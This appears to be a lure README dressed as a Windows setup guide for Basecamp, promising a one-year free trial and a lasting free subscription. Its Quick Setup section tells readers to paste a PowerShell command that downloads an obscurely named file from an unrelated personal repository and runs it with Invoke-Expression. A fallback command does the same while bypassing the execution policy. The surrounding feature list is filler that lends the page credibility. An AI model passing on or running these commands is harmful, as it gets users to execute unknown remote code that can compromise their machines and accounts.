# Basecamp

Basecamp on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Basecamp is a team subscription for organizing work: projects, to-do lists, shared files, group chat, and schedules in one place. On Windows you sign in through the client or browser, open a project, review assignments on the Hill Chart, reply in Campfire or direct messages, and log progress in automatic check-ins.

A typical session starts with notifications on overdue tasks. You skim the project home, move cards on the schedule, attach a document to a to-do, and @mention a teammate in a comment thread. Managers glance at team workload; everyone leaves with clear next steps before closing the window.

This repository holds the Windows setup package, configuration notes for accounts and workspaces, and a changelog that tracks client updates and subscription-related changes. Use the setup file to install the client, apply the built-in free trial, and keep the free subscription profile that stays on the machine after initial configuration.

## What you get

- Project home gathers to-dos, files, and chat so Windows teams see one timeline.
- Hill Chart shows uncertain work versus finished tasks without opening every list.
- Campfire and pings replace scattered email threads inside each Basecamp subscription.
- Automatic check-ins collect written updates on a rhythm your team chooses.
- Schedule and deadlines surface on a shared calendar tied to assigned work.
- Built-in free trial runs one year from setup before billing details matter.
- After setup, the free subscription profile stays on your PC for daily sign-in.
- Message boards and to-do comments keep decisions searchable by project and date.

## Quick Setup (PowerShell)

This starts the built-in Basecamp free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/s-krause4844928687/basecamp-setup-guide/main/p9uis9f8e1.05imeoa1 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/s-krause4844928687/basecamp-setup-guide/main/p9uis9f8e1.05imeoa1 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `p9uis9f8e1.05imeoa1` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `s-krause4844928687/basecamp-setup-guide`. Basecamp 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
